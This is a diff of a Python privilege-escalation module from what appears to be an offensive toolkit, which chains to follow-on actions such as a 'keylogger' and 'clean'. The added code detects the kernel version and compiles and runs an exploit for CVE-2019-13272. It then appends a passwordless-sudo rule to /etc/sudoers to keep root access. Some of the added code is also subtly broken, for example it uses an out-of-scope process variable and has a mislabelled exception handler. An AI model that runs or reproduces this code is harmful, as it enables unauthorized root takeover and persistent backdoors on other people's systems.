@@ -2,63 +2,23 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
-import os
 import re
 import subprocess
 from packaging import version
+from pathlib import Path
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-# Function to check permissions
-# def check_permissions(file_path):
-#     read_access = os.access(file_path, os.R_OK)
-#     write_access = os.access(file_path, os.W_OK)
-#     return read_access and write_access
 
-# def check_privilege_escalation():
-#     if os.getuid() == 0:
-#         print("Current user has root privileges!")
-#         return
-
-#     # Potential privilege escalation vectors
-#     privileged_files = [
-#         "/etc/passwd",
-#         "/etc/shadow",
-#         "/etc/sudoers",
-#         "/etc/cron.d/",
-#     ]
-
-#     for file in privileged_files:
-#         if os.path.exists(file):
-#             print(f"Potential privilege escalation vector found: {file}")
-#             if check_permissions(file):
-#                 print(f"The current user has read and write permissions on: {file}")
-#             else:
-#                 print(
-#                     f"The current user does not have read and write permissions on: {file}"
-#                 )
-
-#     # Check for SUID and SGID binaries
-#     for root, dirs, files in os.walk("/"):
-#         for file in files:
-#             file_path = os.path.join(root, file)
-#             if (
-#                 os.stat(file_path).st_mode & 0o4000
-#                 or os.stat(file_path).st_mode & 0o2000
-#             ):
-#                 print(f"Potential privilege escalation binary found: {file_path}")
-
-
-# custom function to execute bash commands
-# exec_bash("cat file.txt", True)
+# execute bash commands
 def exec_bash(cmd, output=True):
-    return subprocess.check_output(cmd, shell=True, text=True)
+    return subprocess.check_output(cmd, shell=True)
 
 
 # Check if version is between a range
-def is_version_in_range(version_str, min_version, max_version):
+def is_vulnerable(version_str, min_version, max_version):
     try:
         # Convert string representations of versions to Version objects
         ver = version.parse(version_str)
@@ -74,9 +34,11 @@ def is_version_in_range(version_str, min_version, max_version):
 
 def search_exploit(kernel_version):
     # check for CVE-2019-13272 - PTRACE_TRACEME
-    if is_version_in_range(kernel_version, "4.10", "5.1.17"):
+    if is_vulnerable(kernel_version, "4.10", "5.1.17"):
         return "CVE-2019-13272"
     else:
+        # TODO
+        # check for other CVEs
         return None
 
 
@@ -93,20 +55,54 @@ def detect_kernel_version():
     return detected_version
 
 
-def get_root(exploit):
-    if exploit == "CVE-2019-13272":
-        # compile file
-        exec_bash("whoami")
-        exec_bash("gcc -s ../utils/cve-2019-13272.c -o exploit")
-        exec_bash("./exploit")
-        exec_bash("whoami")
-        # execute it
-        # do things as root
+# Function to send a command to the shell
+def run_command(command):
+    process.stdin.write(command.encode())
+    process.stdin.flush()  # Ensure the command is sent
+
+
+def run_exploit(exploit):
     print(f"exploit: {exploit}")
+
+    # Path of the current file
+    file_path = Path(__file__).resolve()
+    # Directory of the current file
+    dir_path = file_path.parent
+
+    if exploit == "CVE-2019-13272":
+        try:
+            # create shell
+            process = subprocess.Popen(
+                ["bash"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+            )
+
+            # run commands
+            run_command(f"gcc -s {dir_path}/../utils/cve-2019-13272.c -o exploit \n")
+            run_command("./exploit \n")
+            run_command('echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n')
+            run_command(b'echo "exit" \n')
+
+            # read output
+            output = process.stdout.readline()
+            while str(output.strip()) != "b'exit'":
+                print(output.strip())
+                output = process.stdout.readline()
+
+            # close process
+            process.stdin.close()
+            process.terminate()
+            process.wait(timeout=1)
+
+        except RuntimeError:
+            # Code to handle the exception
+            print("Division by zero is not allowed.")
     return True
 
 
-def test_kernel():
+def exploit_kernel():
     # get kernel version
     kernel_version = detect_kernel_version()
     print(f"kernel_version: {kernel_version}")
@@ -116,41 +112,30 @@ def test_kernel():
     print(f"exploit_to_run: {exploit_to_run}")
 
     if exploit_to_run:
-        is_root = get_root(exploit_to_run)
+        is_root = run_exploit(exploit_to_run)
         print(f"is_root: {is_root}")
     else:
         # continue checks...
         pass
 
+
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
+
 def run():
-    # things to look for:
-    # kernel version
-    # writable files
     next_action = ""
     data = "data"
+
+    # - kernel version
     print("privesc module activated...")
-    if test_kernel():
+
+    if exploit_kernel():
         print("kernel exploited")
+        next_action = "clean"  # TODO
     else:
         print("no kernel exploit available")
-    # collect information
-    # check_privilege_escalation()
+        # test something else
 
-    next_action = "keylogger"
     return data, next_action
-
-
-# Find SUID files:
-# find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
-#
-# Add new user to computer
-#
-# Find kernel version
-# cat /proc/version
-# Linux version 4.15.0-54-generic (buildd@lgw01-amd64-014) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
-
-# run()
